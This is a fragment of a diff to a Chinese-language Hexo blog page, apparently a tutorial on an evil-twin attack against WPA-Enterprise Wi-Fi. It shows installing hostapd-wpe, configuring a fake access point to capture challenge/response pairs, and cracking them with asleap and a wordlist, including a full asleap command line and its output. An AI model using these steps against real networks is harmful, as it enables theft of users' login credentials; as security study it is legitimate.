-┌──(root㉿kali)-[/etc/default]
-└─# apt-get install hostapd-wpe</code></pre>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─<span class="comment"># apt-get install hostapd</span></span><br><span class="line"></span><br><span class="line">┌──(root㉿kali)-[/etc/default]</span><br><span class="line">└─<span class="comment"># apt-get install hostapd-wpe</span></span><br></pre></td></tr></table></figure>
 <p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220612092731979-456003736.png" /></p>
 <p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220612092842029-1669037630.png" /></p>
 <h3 id="伪造ap">2、伪造AP</h3>
-<pre><code>┌──(root㉿kali)-[/etc/hostapd-wpe]
-└─# vim hostapd-wpe.conf  </code></pre>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/etc/hostapd-wpe]</span><br><span class="line">└─<span class="comment"># vim hostapd-wpe.conf  </span></span><br></pre></td></tr></table></figure>
 <p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220612094735653-754986430.png" /></p>
 <p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220612094553139-981183934.png" /></p>
 <p><strong>当用户连接时会要求输入用户名和密码进行验证，因为时假AP，所以验证不成功，但此时就可以获得challenge和response</strong></p>
 <h3 id="asleap破解">3、asleap破解</h3>
 <p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220612110639472-1825287219.png" /></p>
-<p>** 注，asleap 2.3 破解时会报错（如下），建议使用asleap 2.2
-的破解（如上图）**</p>
-<pre><code>**┌──(root㉿kali)-[~/Desktop/ Tools]
-└─# asleap -C f4:5e:4a:cb:f5:7c:2f:73 -R e8:8d:72:81:36:bf:7d:eb:d5:47:82:bd:cf:1e:24:19:23:a8:45:a7:15:e9:98:49 -W /usr/share/john/password.lst
-asleap 2.3 - actively recover LEAP/PPTP passwords. &lt;jwright@hasborg.com&gt;
-Using wordlist mode with &quot;/usr/share/john/password.lst&quot;.
-        Could not recover last 2 bytes of hash from the
-        challenge/response.  Sorry it didn&#39;t work out.**</code></pre>
+<p><strong>注，asleap 2.3 破解时会报错（如下），建议使用asleap 2.2
+的破解（如上图）</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/Desktop/ Tools]</span><br><span class="line">└─<span class="comment"># asleap -C f4:5e:4a:cb:f5:7c:2f:73 -R e8:8d:72:81:36:bf:7d:eb:d5:47:82:bd:cf:1e:24:19:23:a8:45:a7:15:e9:98:49 -W /usr/share/john/password.lst</span></span><br><span class="line">asleap 2.3 - actively recover LEAP/PPTP passwords. &lt;jwright@hasborg.com&gt;</span><br><span class="line">Using wordlist mode with <span class="string">&quot;/usr/share/john/password.lst&quot;</span>.</span><br><span class="line">Could not recover last 2 bytes of <span class="built_in">hash</span> from the</span><br><span class="line">challenge/response.  Sorry it didn<span class="string">&#x27;t work out.**</span></span><br></pre></td></tr></table></figure>
 <p><strong>asleap下载：<a
 target="_blank" rel="noopener" href="https://http.kali.org/pool/main/a/asleap/"
-class="uri">https://http.kali.org/pool/main/a/asleap/</a> 或 <a
+class="uri">https://http.kali.org/pool/main/a/asleap/</a> 或<a
 target="_blank" rel="noopener" href="https://github.com/joswr1ght/asleap"
 class="uri">https://github.com/joswr1ght/asleap</a></strong></p>
 <h3 id="安装方法二">4、安装方法二</h3>
-<p><strong>自己编译安装hostapd的教程参见：&lt;https://warroom.rsmus.com/evil-twin-attack-using-
-hostapd-wpe/&gt;</strong></p>
+<p><strong>自己编译安装hostapd的教程参见：<a
+target="_blank" rel="noopener" href="https://warroom.rsmus.com/evil-twin-attack-using-hostapd-wpe/"
+class="uri">https://warroom.rsmus.com/evil-twin-attack-using-hostapd-wpe/</a></strong></p>
 <p><strong>注，原教程中需安装的依赖包可从下面地址下载</strong></p>
-<p>****libnl1：&lt;https://old-
-releases.ubuntu.com/ubuntu/pool/universe/libn/libnl/libnl1_1.1-7_amd64.deb&gt;****</p>
-<p><strong>libnl-dev：&lt;https://old-
-releases.ubuntu.com/ubuntu/pool/universe/libn/libnl/libnl-
-dev_1.1-7_amd64.deb&gt;</strong></p>
-<p><strong>multiarch-support：&lt;https://old-
-releases.ubuntu.com/ubuntu/pool/main/g/glibc/multiarch-
-support_2.19-10ubuntu2.3_amd64.deb&gt;</strong></p>
+<p><strong>libnl1：<a
+target="_blank" rel="noopener" href="https://old-releases.ubuntu.com/ubuntu/pool/universe/libn/libnl/libnl1_1.1-7_amd64.deb"
+class="uri">https://old-releases.ubuntu.com/ubuntu/pool/universe/libn/libnl/libnl1_1.1-7_amd64.deb</a></strong></p>
+<p><strong>libnl-dev：<a
+target="_blank" rel="noopener" href="https://old-releases.ubuntu.com/ubuntu/pool/universe/libn/libnl/libnl-dev_1.1-7_amd64.deb"
+class="uri">https://old-releases.ubuntu.com/ubuntu/pool/universe/libn/libnl/libnl-dev_1.1-7_amd64.deb</a></strong></p>
+<p><strong>multiarch-support：<a
+target="_blank" rel="noopener" href="https://old-releases.ubuntu.com/ubuntu/pool/main/g/glibc/multiarch-support_2.19-10ubuntu2.3_amd64.deb"
+class="uri">https://old-releases.ubuntu.com/ubuntu/pool/main/g/glibc/multiarch-support_2.19-10ubuntu2.3_amd64.deb</a></strong></p>
 <p><strong>hostapd：<a target="_blank" rel="noopener" href="https://w1.fi/releases/hostapd-2.2.tar.gz"
 class="uri">https://w1.fi/releases/hostapd-2.2.tar.gz</a></strong></p>
 
@@ -537,7 +492,7 @@ class="uri">https://w1.fi/releases/hostapd-2.2.tar.gz</a></strong></p>
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
-    <span title="站点阅读时长">10:14</span>
+    <span title="站点阅读时长">10:15</span>
   </span>
 </div>
   <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
